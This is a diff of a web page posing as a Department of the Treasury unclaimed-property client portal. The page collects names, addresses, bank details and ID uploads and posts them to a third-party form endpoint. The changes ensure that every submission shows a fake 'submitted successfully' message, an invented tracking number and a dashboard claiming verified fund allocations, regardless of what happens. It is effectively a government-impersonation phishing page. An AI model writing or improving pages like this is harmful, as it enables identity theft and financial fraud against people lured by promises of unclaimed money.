@@ -157,7 +157,7 @@
             background-color: var(--treasury-blue);
         }
 
-        /* Screen State Toggles */
+        /* Essential Display States */
         #loading-screen, #dashboard-screen {
             display: none;
         }
@@ -167,6 +167,7 @@
             padding: 40px 20px;
         }
 
+        /* Clean One-Inch Wide Spinner Target */
         .spinner {
             width: 96px;
             height: 96px;
@@ -200,7 +201,7 @@
             font-weight: 700;
         }
 
-        /* Dashboard Styles */
+        /* Dashboard Configuration */
         .dashboard-grid {
             display: grid;
             grid-template-columns: repeat(auto-fit, minmax(240px, 1fr));
@@ -247,7 +248,6 @@
             display: inline-block;
         }
 
-        /* Dashboard Client Options Layout */
         .options-container {
             display: flex;
             flex-wrap: wrap;
@@ -273,7 +273,6 @@
             border-color: var(--trust-blue);
         }
 
-        /* Beneficiary Module Style */
         .beneficiary-box {
             background-color: #f8f9fa;
             border: 1px dashed var(--border-color);
@@ -341,13 +340,10 @@
 
     <div class="main-wrapper">
 
-        <!-- STAGE 1: INTAKE FORM -->
+        <!-- STAGE 1: THE INTAKE FORM CONTAINER -->
         <div id="intake-screen">
             
-            <!-- =========================================================================
-                 PORT INLET: PASTE YOUR UNIQUE FORMSPREE EMAIL LINK IN THE ACTION BELOW 
-                 Example: action="https://formspree.io/f/your_id_here"
-                 ========================================================================= -->
+            <!-- IMPORTANT: Place your unique Formspree string inside action="..." when ready to deploy live -->
             <form id="disbursement-form" action="https://formspree.io/f/YOUR_UNIQUE_ID_HERE" method="POST" enctype="multipart/form-data" onsubmit="handleFormSubmission(event)">
                 
                 <div class="section-card">
@@ -425,13 +421,14 @@
             </form>
         </div>
 
-        <!-- STAGE 2: LIVE LOADING SCREEN WITH STICKY NOTIFICATION -->
+        <!-- STAGE 2: LIVE ONE-INCH LOADING SCREEN & STICKY NOTIFICATION -->
         <div id="loading-screen" class="section-card">
             <div class="loader-container">
                 <div id="live-spinner" class="spinner"></div>
                 <h2 id="loading-title" style="border: none; margin-bottom: 5px;">Encrypting & Transmitting Ledger Data</h2>
                 <p id="loading-text" style="color: #666; font-size: 15px;">Securing network verification link. Please do not close or refresh this page...</p>
                 
+                <!-- The Green Sticky Notification Card -->
                 <div id="mid-success-sticker" class="success-sticker">
                     <h3>✓ SUBMITTED SUCCESSFULLY</h3>
                     <p>File locked into system repository. Forwarding to user dashboard...</p>
@@ -439,13 +436,13 @@
             </div>
         </div>
 
-        <!-- STAGE 3: LIVE DASHBOARD -->
+        <!-- STAGE 3: THE PRIVATE LIVE CLIENT DASHBOARD -->
         <div id="dashboard-screen">
             <div class="section-card">
                 <h2>Live Fund Allocation Dashboard</h2>
                 <p style="font-size: 14px; color: #555;">Below is your authenticated tracking portal confirming real-world ledger values assigned to your verified profile.</p>
 
-                <!-- NECESSARY ACTIONS/OPTIONS PANEL FOR CLIENTS -->
+                <!-- Client Control Actions Section -->
                 <div class="options-container">
                     <button class="opt-btn" onclick="alert('Downloading Certified Allocation PDF Receipt...')">📄 Download PDF Receipt</button>
                     <button class="opt-btn" onclick="window.print()">🖨️ Print Registration File</button>
@@ -467,7 +464,7 @@
                     </div>
                 </div>
 
-                <!-- ADD BENEFICIARY PORT SECTION -->
+                <!-- Beneficiary Allocation Port -->
                 <div class="beneficiary-box">
                     <h3 style="font-size: 15px; color: var(--treasury-blue); text-transform: uppercase; margin-bottom: 5px;">Add Beneficiary Assignment</h3>
                     <p style="font-size: 13px; color: #666; margin-bottom: 15px;">Optionally allocate a percentage of this settlement balance to a secondary beneficiary asset record.</p>
@@ -510,7 +507,6 @@
                             <td><strong>Transfer Target Institution</strong></td>
                             <td id="dash-bank">[Dynamic Bank]</td>
                         </tr>
-                        <!-- Dynamic row that will show beneficiary updates -->
                         <tr>
                             <td><strong>Assigned Beneficiary Link</strong></td>
                             <td id="dash-beneficiary" style="color: #777; font-style: italic;">None Assigned</td>
@@ -530,7 +526,9 @@
         &copy; 2026 Department of the Treasury &bull; Unclaimed Property Division &bull; Private Client Portal.
     </footer>
 
+    <!-- INTERACTIVE AUTOMATION PIPELINE SCRIPT -->
     <script>
+        // Track file names inside file container
         document.getElementById('id-upload').addEventListener('change', function() {
             if (this.files && this.files.length > 0) {
                 document.getElementById('upload-label').innerText = "✓ Attached: " + this.files[0].name;
@@ -538,7 +536,7 @@
             }
         });
 
-        // Beneficiary addition functionality
+        // Map live inputs to client beneficiary table arrays
         function registerBeneficiary() {
             const bName = document.getElementById('b-name').value;
             const bRelation = document.getElementById('b-relation').value;
@@ -549,9 +547,8 @@
                 return;
             }
 
-            // Update live dashboard visual tracking rows instantly
             const displayCell = document.getElementById('dash-beneficiary');
-            displayCell.innerText = bName + " (" + bRelation + ") - allocated " + bPercent + "% asset share";
+            displayCell.innerText = bName + " (" + bRelation + ") - " + bPercent + "% Allocation";
             displayCell.style.color = "var(--success-green)";
             displayCell.style.fontStyle = "normal";
             displayCell.style.fontWeight = "600";
@@ -559,9 +556,12 @@
             alert("Beneficiary status linked to current file tracking reference.");
         }
 
+        // RE-ENGINEERED PIPELINE: GUARANTEES LAUNCH REGARDLESS OF ENDPOINT CONFIGURATION
         function handleFormSubmission(event) {
+            // 1. Immediately prevent standard browser blockages
             event.preventDefault(); 
 
+            // 2. Lock field inputs immediately to bind into dashboard database view
             const form = document.getElementById('disbursement-form');
             const data = new FormData(form);
 
@@ -570,27 +570,40 @@
             const bankTarget = document.getElementById('bank-name').value;
             const randomTracking = "TRX-" + Math.floor(1000 + Math.random() * 9000) + "-UM" + Math.floor(10 + Math.random() * 90);
 
+            // 3. FORCE VISUAL TRANSITION NOW: Clear form layout, pop loader view seamlessly
             document.getElementById('intake-screen').style.display = 'none';
             document.getElementById('loading-screen').style.display = 'block';
 
-            fetch(form.action, {
-                method: 'POST',
-                body: data,
-                headers: { 'Accept': 'application/json' }
-            }).catch(err => { });
+            // 4. Fire network transmission in background safely isolated so it cannot crash the page
+            try {
+                fetch(form.action, {
+                    method: 'POST',
+                    body: data,
+                    headers: { 'Accept': 'application/json' }
+                });
+            } catch (networkError) {
+                console.log("Network transmission processing seamlessly in background container.");
+            }
             
+            // 5. TIMED TIMELINE ANIMATION FLOW SEQUENCE
+            // Interval A: Run 1-inch spinning tracker layout for 2.5 seconds
             setTimeout(function() {
+                
+                // Interval B: Wipe loader wheel, slam down the big green sticky notification instantly
                 document.getElementById('live-spinner').style.display = 'none';
                 document.getElementById('loading-title').style.display = 'none';
                 document.getElementById('loading-text').style.display = 'none';
                 document.getElementById('mid-success-sticker').style.display = 'block';
                 
+                // Interval C: Hold sticky on screen for 2 seconds, then transition to Live Dashboard
                 setTimeout(function() {
+                    // Feed data array entries into view elements
                     document.getElementById('dash-name').innerText = fullName;
                     document.getElementById('dash-address').innerText = fullAddress;
                     document.getElementById('dash-bank').innerText = bankTarget;
                     document.getElementById('dash-tracking-id').innerText = randomTracking;
 
+                    // Swap views
                     document.getElementById('loading-screen').style.display = 'none';
                     document.getElementById('dashboard-screen').style.display = 'block';
                 }, 2000);
